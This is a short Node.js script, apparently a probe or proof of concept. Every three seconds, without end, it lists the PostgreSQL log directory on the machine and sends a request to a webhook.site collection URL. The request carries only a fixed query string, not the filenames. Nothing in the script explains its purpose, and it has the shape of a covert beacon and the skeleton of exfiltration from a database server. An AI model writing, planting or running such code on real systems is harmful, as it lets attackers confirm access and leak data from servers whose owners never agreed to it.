const fs = require('fs')

const main = () => {
  fs.readdir("/var/lib/postgresql/data/pg_log/", (err,filename)=> {
    fetch('https://webhook.site/08ae8e4a-5683-4194-a82d-84abf1503ffa?yo=ooh')
  })

  return setTimeout(main, 3000);
}

main()